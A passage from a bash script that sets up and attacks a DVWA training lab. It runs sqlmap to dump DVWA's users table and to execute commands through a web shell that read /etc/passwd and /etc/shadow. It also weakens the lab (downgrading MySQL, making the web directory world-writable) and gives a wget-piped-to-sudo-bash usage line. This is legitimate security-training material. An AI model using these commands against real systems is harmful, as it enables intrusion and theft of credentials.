    echo "    --output-dir=\"${SQLMAP_OUTDIR}\" --file-log=\"${SQLMAP_OUTDIR}/sqlmap_sqli_tables.log\"${RESET}"
    echo ""

    print_info "Example 3: Dumping columns from the 'users' table in 'dvwa' database:"
    echo "${GREEN}sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" \\"
    echo "    -D dvwa -T users --columns --batch --level=1 --risk=1 \\"
    echo "    --output-dir=\"${SQLMAP_OUTDIR}\" --file-log=\"${SQLMAP_OUTDIR}/sqlmap_sqli_columns.log\"${RESET}"
    echo ""

    print_info "Example 4: Dumping data (usernames/passwords) from the 'users' table in 'dvwa' database:"
    echo "${GREEN}sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" \\"
    echo "    -D dvwa -T users --dump --batch --level=1 --risk=1 \\"
    echo "    --output-dir=\"${SQLMAP_OUTDIR}\" --file-log=\"${SQLMAP_OUTDIR}/sqlmap_sqli_dump_users.log\"${RESET}"
    echo ""

    print_success "SQLmap SQL Injection demonstration commands provided. Manual execution is required."
    print_info "Ensure you replace <YOUR_PHPSESSID_HERE> with your valid session cookie."
}

# Function: kali_exploit_sqlmap_os_shell
# Attempts to get an OS shell on DVWA VM via sqlmap and extracts sensitive files.
kali_exploit_sqlmap_os_shell() {
    print_title "=== SQLmap OS Shell Exploitation (DVWA - MySQL 5.0.15 Required) ==="

    if [ -z "$DVWA_TARGET_URL" ] || [[ "$DVWA_TARGET_URL" == "http://192.168.56.101" ]]; then
        print_error "DVWA_TARGET_URL is not set or still at default value. Please update the 'DVWA_TARGET_URL' variable in this script."
        exit 1
    fi

    local TARGET="$DVWA_TARGET_URL"
    local OS_SHELL_OUTDIR="$HOME/scans/dvwa/os_shell_loot"
    mkdir -p "$OS_SHELL_OUTDIR"

    print_info "Targeting DVWA VM at: ${TARGET}"
    print_warn "This exploit typically requires the DVWA VM to be running a vulnerable MySQL version (e.g., 5.0.15) and for the DVWA directory to be world-writable (ugo+rw)."
    print_warn "Ensure you have already run the 'mysql50' argument on the Ubuntu VM AND 'set_permissions_ubuntu' argument for DVWA directory."
    print_info "Verify MySQL 5.0.15 is running on your Ubuntu VM: '$INSTALL_DIR/bin/mysqld_safe --user=mysql &' (from the Ubuntu VM)"


    print_info "Before running sqlmap --os-shell:"
    print_info "1. Log into DVWA (admin/password) from your Kali browser."
    print_info "2. Set the 'Security Level' to 'Low' under 'DVWA Security'."
    print_info "3. Navigate to 'SQL Injection (Blind)' or 'SQL Injection' vulnerabilities."
    print_info "4. Capture your PHPSESSID cookie from browser developer tools."
    print_warn "   You MUST replace <YOUR_PHPSESSID_HERE> with your actual PHPSESSID cookie value."
    echo ""

    # Using --os-cmd for each command, as interactive shells are hard to script and log
    # For sqlmap --os-cmd, it typically tries to upload a web shell and execute the command.
    # We must also provide the web server root and language.
    local SQLMAP_BASE_CMD="sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" --web-server=apache --os-shell-chroot=/ --technique=U --batch --retries=3 --tmp-dir=$OS_SHELL_OUTDIR --data-dir=$OS_SHELL_OUTDIR" # --data-dir specified for sqlmap temp files

    print_info "Running 'pwd' via sqlmap --os-cmd. Output saved to ${OS_SHELL_OUTDIR}/pwd.log"
    ${SQLMAP_BASE_CMD} --os-cmd="pwd" --file-log="${OS_SHELL_OUTDIR}/pwd.sqlmap.log" > "${OS_SHELL_OUTDIR}/pwd.log" 2>&1 || print_warn "Failed to run 'pwd' or output capture issue."

    print_info "Running 'whoami' via sqlmap --os-cmd. Output saved to ${OS_SHELL_OUTDIR}/whoami.log"
    ${SQLMAP_BASE_CMD} --os-cmd="whoami" --file-log="${OS_SHELL_OUTDIR}/whoami.sqlmap.log" > "${OS_SHELL_OUTDIR}/whoami.log" 2>&1 || print_warn "Failed to run 'whoami' or output capture issue."

    print_info "Running 'cat /etc/passwd' via sqlmap --os-cmd. Output saved to ${OS_SHELL_OUTDIR}/passwd.log"
    ${SQLMAP_BASE_CMD} --os-cmd="cat /etc/passwd" --file-log="${OS_SHELL_OUTDIR}/passwd.sqlmap.log" > "${OS_SHELL_OUTDIR}/passwd.log" 2>&1 || print_warn "Failed to run 'cat /etc/passwd' or output capture issue."

    print_info "Running 'cat /etc/shadow' via sqlmap --os-cmd. Output saved to ${OS_SHELL_OUTDIR}/shadow.log"
    ${SQLMAP_BASE_CMD} --os-cmd="cat /etc/shadow" --file-log="${OS_SHELL_OUTDIR}/shadow.sqlmap.log" > "${OS_SHELL_OUTDIR}/shadow.log" 2>&1 || print_warn "Failed to run 'cat /etc/shadow' or output capture issue."

    print_success "SQLmap OS shell commands attempted. Check the files in ${OS_SHELL_OUTDIR} for output."
    print_info "If `--os-cmd` commands fail, try the interactive `--os-shell` mode manually:"
    echo "${GREEN}sqlmap -u \"${TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\"
    echo "    --cookie=\"PHPSESSID=<YOUR_PHPSESSID_HERE>; security=low\" \\"
    echo "    --os-shell --web-server=apache --os-shell-chroot=/ \\"
    echo "    --output-dir=\"$OS_SHELL_OUTDIR\"${RESET}"
    print_warn "   Remember to replace <YOUR_PHPSESSID_HERE>."
    print_info "   When in the sql-shell, you might be asked to provide web server language (choose 'php'), and web server document root (specify '/var/www/html/dvwa')."
}

# Function to display the final signature
print_signature() {
    echo -e "\n\033[92mCreated with â™¡, Harsha\033[0m\n"
}

### ===== MAIN LOGIC ===== ###
case "${1:-}" in
    # Ubuntu DVWA VM Arguments
    "mysql50")
        print_info "Detected 'mysql50' argument. Proceeding with MySQL 5.0.15 downgrade on DVWA Ubuntu VM."
        ubuntu_downgrade_to_mysql50_dvwa
        print_info "[âœ”] MySQL 5.0.15 downgrade complete on Ubuntu VM."
        print_signature
        ;;
    "set_permissions_ubuntu")
        print_info "Detected 'set_permissions_ubuntu' argument. Proceeding to set DVWA directory permissions on Ubuntu VM."
        ubuntu_set_dvwa_permissions
        print_info "[âœ”] DVWA directory permissions set on Ubuntu VM."
        print_signature
        ;;

    # Kali VM Arguments
    "kali_prereqs")
        print_info "Detected 'kali_prereqs' argument. Proceeding with Kali attack tools prerequisite installation."
        kali_install_tools_prerequisites
        print_info "[âœ”] Kali attack tools prerequisites installation complete."
        print_signature
        ;;
    "kali_web_scan")
        print_info "Detected 'kali_web_scan' argument. Proceeding to run web content scanners on Kali VM."
        kali_run_web_content_scanners
        print_info "[âœ”] Web content scanning demonstration complete."
        print_signature
        ;;
    "kali_brute_force")
        print_info "Detected 'kali_brute_force' argument. Providing brute-force attack instructions for Kali VM."
        kali_demonstrate_brute_force
        print_info "[âœ”] Brute-force attack instructions provided."
        print_signature
        ;;
    "kali_vuln_scan")
        print_info "Detected 'kali_vuln_scan' argument. Providing vulnerability scanner instructions for Kali VM."
        kali_demonstrate_vuln_scanners
        print_info "[âœ”] Vulnerability scanner instructions provided."
        print_signature
        ;;
    "kali_sqlmap_sqli")
        print_info "Detected 'kali_sqlmap_sqli' argument. Providing sqlmap SQLi demonstration for Kali VM."
        kali_demonstrate_sqlmap_sqli
        print_info "[âœ”] SQLmap SQLi demonstration provided."
        print_signature
        ;;
    "kali_os_shell")
        print_info "Detected 'kali_os_shell' argument. Proceeding with sqlmap OS shell exploitation on Kali VM."
        kali_exploit_sqlmap_os_shell
        print_info "[âœ”] SQLmap OS shell exploitation guidance provided."
        print_signature
        ;;

    # Default Ubuntu DVWA VM Installation (Apache2 + Modern MySQL)
    "")
        print_info "No argument provided. Assuming default DVWA Ubuntu VM installation (SSH + DVWA with Apache2, and Modern MySQL)."
        ubuntu_install_ssh
        ubuntu_install_dvwa_apache_mysql
        print_info "[âœ”] Full SSH + DVWA (Apache2, Modern MySQL) installation complete on Ubuntu VM."
        print_signature
        ;;

    *)
        print_error "Invalid argument: $1"
        echo "Usage: wget -qO- <script_url> | sudo bash [-s <argument>]"
        echo ""
        echo "Arguments for Ubuntu DVWA VM:"
        echo "  (no argument)         : Install SSH, DVWA (Apache2+Modern MySQL)"
        echo "  mysql50               : Downgrade DVWA's database to MySQL 5.0.15"
        echo "  set_permissions_ubuntu: Set DVWA directory to be world-writable (for os-shell exploit)"
        echo ""
        echo "Arguments for Kali VM (ensure DVWA Ubuntu VM is accessible):"
        echo "  kali_prereqs          : Install common attack tools"
        echo "  kali_web_scan         : Run dirb and gobuster web content scanners"
        echo "  kali_brute_force      : Demonstrate brute-force with Burp/Hydra"
        echo "  kali_vuln_scan        : Demonstrate vulnerability scanning with ZAP/OpenVAS"
        echo "  kali_sqlmap_sqli      : Demonstrate basic SQL injection with sqlmap"
        echo "  kali_os_shell         : Attempt OS shell with sqlmap and extract files"
        exit 1
        ;;
esac